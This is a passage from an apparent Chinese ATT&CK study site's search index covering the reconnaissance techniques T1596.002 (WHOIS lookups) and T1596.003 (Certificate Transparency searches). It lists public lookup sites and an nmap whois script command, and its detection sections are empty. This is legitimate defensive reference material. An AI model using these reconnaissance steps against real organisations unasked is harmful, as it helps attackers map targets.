0\u8bbe\u65bd\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u4fe1\u4efb\u5173\u7cfb\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b whois\uff08\u8bfb\u4f5c\u201cWho is\u201d\uff0c\u975e\u7f29\u5199\uff09\u662f\u7528\u6765\u67e5\u8be2\u57df\u540d\u7684IP\u4ee5\u53ca\u6240\u6709\u8005\u7b49\u4fe1\u606f\u7684\u4f20\u8f93\u534f\u8bae\u3002\u7b80\u5355\u8bf4\uff0cwhois\u5c31\u662f\u4e00\u4e2a\u7528\u6765\u67e5\u8be2\u57df\u540d\u662f\u5426\u5df2\u7ecf\u88ab\u6ce8\u518c\uff0c\u4ee5\u53ca\u6ce8\u518c\u57df\u540d\u7684\u8be6\u7ec6\u4fe1\u606f\u7684\u6570\u636e\u5e93\uff08\u5982\u57df\u540d\u6240\u6709\u4eba\u3001\u57df\u540d\u6ce8\u518c\u5546\uff09\u3002\u901a\u8fc7whois\u6765\u5b9e\u73b0\u5bf9\u57df\u540d\u4fe1\u606f\u7684\u67e5\u8be2\u3002 \u7f51\u7ad9\u67e5\u8be2 \u57df\u540dWhois\u67e5\u8be2 - \u7ad9\u957f\u4e4b\u5bb6 Whois \u7231\u7ad9 ip138 \u57df\u540d\u4fe1\u606f\u67e5\u8be2 - \u817e\u8baf\u4e91 nicolasbouliane \u65b0\u7f51 whois\u4fe1\u606f\u67e5\u8be2 IP WHOIS\u67e5\u8be2 - \u7ad9\u957f\u5de5\u5177 \u5fae\u6b65\u5728\u7ebf Bugscaner \u5de5\u5177\u67e5\u8be2 \u5728\u547d\u4ee4\u884c\u8f93\u5165whosi+\u57df\u540d \u4f7f\u7528Nmap\u67e5\u8be2\uff0c\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u7206\u51fa\u76ee\u6807\u7684\u7aef\u53e3\u53f7\u5f00\u542f\u4e0e\u5426\uff1anmap --script=whois-domain +\u57df\u540d \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1596-002 https://attack.mitre.org/techniques/T1596/002/ Whois\u4fe1\u606f\u6536\u96c6\u53ca\u5229\u7528\u65b9\u5f0f https://blog.csdn.net/m0_48520508/article/details/107301211 whois\u67e5\u8be2.\u767d\u5e3d\u4e0e\u5b89\u5168 https://www.kancloud.cn/noahs/src_hacker/2120641","title":"T1596-002-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-WHOIS"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#t1596-002-whois","text":"","title":"T1596-002-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-WHOIS"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u5728WHOIS\u516c\u5f00\u6570\u636e\u4e2d\u641c\u7d22\u53d7\u5bb3\u8005\u4f7f\u7528\u7684\u76ee\u6807\u4fe1\u606f\u3002WHOIS\u6570\u636e\u7531\u8d1f\u8d23\u5206\u914d\u548c\u5206\u914d\u57df\u540d\u7b49Internet\u8d44\u6e90\u7684\u533a\u57dfInternet\u6ce8\u518c\u8868\uff08RIR\uff09\u5b58\u50a8\u3002\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u67e5\u8be2WHOIS\u670d\u52a1\u5668\u4ee5\u83b7\u53d6\u6709\u5173\u6ce8\u518c\u57df\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u5206\u914d\u7684IP\u5730\u5740\uff0c\u8054\u7cfb\u4fe1\u606f\u548cDNS\u540d\u79f0\u670d\u52a1\u5668\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22WHOIS\u6570\u636e\u7528\u4ee5\u6536\u96c6\u53ef\u884c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u884c\u52a8\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u8d44\u6e90\u6216\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\u901a\u8fc7WHOIS\u6570\u636e\u8fdb\u884c\u63a0\u593a\uff0c\u4ee5\u83b7\u53d6\u6709\u5173\u6f5c\u5728\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\u3002\u8fd9\u4e9b\u6765\u6e90\u63d0\u4f9b\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u7834\u574f\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u4fe1\u4efb\u5173\u7cfb\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_1","text":"whois\uff08\u8bfb\u4f5c\u201cWho is\u201d\uff0c\u975e\u7f29\u5199\uff09\u662f\u7528\u6765\u67e5\u8be2\u57df\u540d\u7684IP\u4ee5\u53ca\u6240\u6709\u8005\u7b49\u4fe1\u606f\u7684\u4f20\u8f93\u534f\u8bae\u3002\u7b80\u5355\u8bf4\uff0cwhois\u5c31\u662f\u4e00\u4e2a\u7528\u6765\u67e5\u8be2\u57df\u540d\u662f\u5426\u5df2\u7ecf\u88ab\u6ce8\u518c\uff0c\u4ee5\u53ca\u6ce8\u518c\u57df\u540d\u7684\u8be6\u7ec6\u4fe1\u606f\u7684\u6570\u636e\u5e93\uff08\u5982\u57df\u540d\u6240\u6709\u4eba\u3001\u57df\u540d\u6ce8\u518c\u5546\uff09\u3002\u901a\u8fc7whois\u6765\u5b9e\u73b0\u5bf9\u57df\u540d\u4fe1\u606f\u7684\u67e5\u8be2\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_2","text":"\u57df\u540dWhois\u67e5\u8be2 - \u7ad9\u957f\u4e4b\u5bb6 Whois \u7231\u7ad9 ip138 \u57df\u540d\u4fe1\u606f\u67e5\u8be2 - \u817e\u8baf\u4e91 nicolasbouliane \u65b0\u7f51 whois\u4fe1\u606f\u67e5\u8be2 IP WHOIS\u67e5\u8be2 - \u7ad9\u957f\u5de5\u5177 \u5fae\u6b65\u5728\u7ebf Bugscaner","title":"\u7f51\u7ad9\u67e5\u8be2"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_3","text":"\u5728\u547d\u4ee4\u884c\u8f93\u5165whosi+\u57df\u540d \u4f7f\u7528Nmap\u67e5\u8be2\uff0c\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u7206\u51fa\u76ee\u6807\u7684\u7aef\u53e3\u53f7\u5f00\u542f\u4e0e\u5426\uff1anmap --script=whois-domain +\u57df\u540d","title":"\u5de5\u5177\u67e5\u8be2"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_4","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_5","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_6","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_7","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_8","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_9","text":"MITRE-ATT&CK-T1596-002 https://attack.mitre.org/techniques/T1596/002/ Whois\u4fe1\u606f\u6536\u96c6\u53ca\u5229\u7528\u65b9\u5f0f https://blog.csdn.net/m0_48520508/article/details/107301211 whois\u67e5\u8be2.\u767d\u5e3d\u4e0e\u5b89\u5168 https://www.kancloud.cn/noahs/src_hacker/2120641","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/","text":"T1596-003-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-\u6570\u5b57\u8bc1\u4e66 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u5728\u516c\u5171\u6570\u5b57\u8bc1\u4e66\u6570\u636e\u4e2d\u641c\u7d22\u6709\u5173\u53d7\u5bb3\u8005\u4f7f\u7528\u7684\u76ee\u6807\u7684\u4fe1\u606f\u3002\u6570\u5b57\u8bc1\u4e66\u7531\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u9881\u53d1\uff0c\u4ee5\u52a0\u5bc6\u65b9\u5f0f\u9a8c\u8bc1\u7b7e\u540d\u5185\u5bb9\u7684\u6765\u6e90\u3002\u8fd9\u4e9b\u8bc1\u4e66\uff08\u4f8b\u5982\u7528\u4e8e\u52a0\u5bc6Web\u6d41\u91cfHTTPS SSL/TLS\u901a\u4fe1\u7684\u8bc1\u4e66\uff09\u5305\u542b\u6709\u5173\u6ce8\u518c\u7ec4\u7ec7\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u540d\u79f0\u548c\u4f4d\u7f6e\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22\u6570\u5b57\u8bc1\u4e66\u6570\u636e\u7528\u4e8e\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u53c2\u4e0e\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u8d44\u6e90\u548c\u67e5\u627e\u5de5\u5177\u6765\u6536\u96c6\u6709\u5173\u8bc1\u4e66\u7684\u4fe1\u606f\u3002\u6570\u5b57\u8bc1\u4e66\u6570\u636e\u4e5f\u53ef\u4ee5\u4ece\u7ec4\u7ec7\u7b7e\u540d\u7684\u7ec4\u4ef6\u4e2d\u83b7\u5f97\uff08\u4f8b\u5982\uff1a\u52a0\u5bc6\u7684\u7f51\u7edc\u6d41\u91cf\u4e2d\u4f7f\u7528\u7684\u8bc1\u4e66\u968f\u5185\u5bb9\u4e00\u8d77\u63d0\u4f9b\uff09\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u5f97\u80fd\u529b\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u8005\u4fe1\u4efb\u5173\u7cfb\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u8bc1\u4e66\u900f\u660e\u5ea6(Certificate Transparency,CT)\u662f\u8bc1\u4e66\u6388\u6743\u673a\u6784(CA)\u7684\u4e00\u4e2a\u9879\u76ee\uff0c\u8bc1\u4e66\u6388\u6743\u673a\u6784\u4f1a\u4e3a\u6bcf\u4e00\u4e2aSSL/TLS\u8bc1\u4e66\u53d1\u5e03\u5230\u516c\u5171\u65e5\u5fd7\u4e2d\u3002\u4e00\u4e2aSSL/TLS\u8bc1\u4e66\u901a\u5e38\u5305\u542b\u57df\u540d\u3001\u5b50\u57df\u540d\u548c\u90ae\u7bb1\u5730\u5740\uff0c\u8fd9\u4e9b\u4e5f\u7ecf\u5e38\u6210\u4e3a\u653b\u51fb\u8005\u975e\u5e38\u5e0c\u671b\u83b7\u5f97\u7684\u6709\u7528\u4fe1\u606f\u3002\u67e5\u627e\u67d0\u4e2a\u57df\u540d\u6240\u5c5e\u8bc1\u4e66\u7684\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u4e00\u4e9b\u516c\u5f00\u7684CT\u65e5\u5fd7\u3002 https://crt.sh/ https://censys.io/ https://developers.facebook.com/tools/ct/ https://google.com/transparencyreport/https/ct/ \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1596-003 https://attack.mitre.org/techniques/T1596/003/ \u5168\u6d41\u7a0b\u4fe1\u606f\u6536\u96c6\u65b9\u6cd5\u603b\u7ed3 https://www.freebuf.com/articles/database/195169.html \u3010\u77e5\u4e86\u5802\u4fe1\u5b89\u7b14\u8bb0\u3011\u6e17\u900f\u6d4b\u8bd5\u4e4b\u4fe1\u606f\u6536\u96c6\uff08\u4e8c\uff09 https://zhuanlan.zhihu.com/p/86250911","title":"T1596-003-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-\u6570\u5b57\u8bc1\u4e66"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#t1596-003-","text":"","title":"T1596-003-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-\u6570\u5b57\u8bc1\u4e66"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u516c\u5171\u6570\u5b57\u8bc1\u4e66\u6570\u636e\u4e2d\u641c\u7d22\u6709\u5173\u53d7\u5bb3\u8005\u4f7f\u7528\u7684\u76ee\u6807\u7684\u4fe1\u606f\u3002\u6570\u5b57\u8bc1\u4e66\u7531\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u9881\u53d1\uff0c\u4ee5\u52a0\u5bc6\u65b9\u5f0f\u9a8c\u8bc1\u7b7e\u540d\u5185\u5bb9\u7684\u6765\u6e90\u3002\u8fd9\u4e9b\u8bc1\u4e66\uff08\u4f8b\u5982\u7528\u4e8e\u52a0\u5bc6Web\u6d41\u91cfHTTPS SSL/TLS\u901a\u4fe1\u7684\u8bc1\u4e66\uff09\u5305\u542b\u6709\u5173\u6ce8\u518c\u7ec4\u7ec7\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u540d\u79f0\u548c\u4f4d\u7f6e\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22\u6570\u5b57\u8bc1\u4e66\u6570\u636e\u7528\u4e8e\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u53c2\u4e0e\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u8d44\u6e90\u548c\u67e5\u627e\u5de5\u5177\u6765\u6536\u96c6\u6709\u5173\u8bc1\u4e66\u7684\u4fe1\u606f\u3002\u6570\u5b57\u8bc1\u4e66\u6570\u636e\u4e5f\u53ef\u4ee5\u4ece\u7ec4\u7ec7\u7b7e\u540d\u7684\u7ec4\u4ef6\u4e2d\u83b7\u5f97\uff08\u4f8b\u5982\uff1a\u52a0\u5bc6\u7684\u7f51\u7edc\u6d41\u91cf\u4e2d\u4f7f\u7528\u7684\u8bc1\u4e66\u968f\u5185\u5bb9\u4e00\u8d77\u63d0\u4f9b\uff09\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u5f97\u80fd\u529b\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u8005\u4fe1\u4efb\u5173\u7cfb\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_1","text":"\u8bc1\u4e66\u900f\u660e\u5ea6(Certificate Transparency,CT)\u662f\u8bc1\u4e66\u6388\u6743\u673a\u6784(CA)\u7684\u4e00\u4e2a\u9879\u76ee\uff0c\u8bc1\u4e66\u6388\u6743\u673a\u6784\u4f1a\u4e3a\u6bcf\u4e00\u4e2aSSL/TLS\u8bc1\u4e66\u53d1\u5e03\u5230\u516c\u5171\u65e5\u5fd7\u4e2d\u3002\u4e00\u4e2aSSL/TLS\u8bc1\u4e66\u901a\u5e38\u5305\u542b\u57df\u540d\u3001\u5b50\u57df\u540d\u548c\u90ae\u7bb1\u5730\u5740\uff0c\u8fd9\u4e9b\u4e5f\u7ecf\u5e38\u6210\u4e3a\u653b\u51fb\u8005\u975e\u5e38\u5e0c\u671b\u83b7\u5f97\u7684\u6709\u7528\u4fe1\u606f\u3002\u67e5\u627e\u67d0\u4e2a\u57df\u540d\u6240\u5c5e\u8bc1\u4e66\u7684\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u4e00\u4e9b\u516c\u5f00\u7684CT\u65e5\u5fd7\u3002 https://crt.sh/ https://censys.io/ https://developers.facebook.com/tools/ct/ https://google.com/transparencyreport/https/ct/","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_7","text":"MITRE-ATT&CK-T1596-003 https://attack.mitre.org/techniques/T1596/003/ \u5168\u6d41\u7a0b\u4fe1\u606f\u6536\u96c6\u65b9\u6cd5\u603b\u7ed3 https://www.freebuf.com/articles/database/195169.html \u3010\u77e5\u4e86\u5802\u4fe1\u5b89\u7b14\u8bb0\u3011\u6e17\u900f\u6d4b\u8bd5\u4e4b\u4fe1\u606f\u6536\u96c6\uff08\u4e8c\uff09 https://zhuanlan.zhihu.com/p/86250911","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/","text":"T1596-004-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-CDN \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22\u6709\u5173\u76ee\u6807\u53d7\u5bb3\u8005\u7684\u5185\u5bb9\u4f20\u9012\u7f51\u7edc\uff08CDN\uff09\u6570\u636e\u3002CDN\u5141\u8bb8\u7ec4\u7ec7\u6258\u7ba1\u6765\u81ea\u5206\u5e03\u5f0f\uff0c\u8d1f\u8f7d\u5747\u8861\u7684\u670d\u52a1\u5668\u9635\u5217\u7684\u5185\u5bb9\u3002CDN\u8fd8\u53ef\u4ee5\u5141\u8bb8\u7ec4\u7ec7\u6839\u636e\u8bf7\u6c42\u8005\u7684\u5730\u7406\u533a\u57df\u81ea\u5b9a\u4e49\u5185\u5bb9\u4f20\u9012\u3002 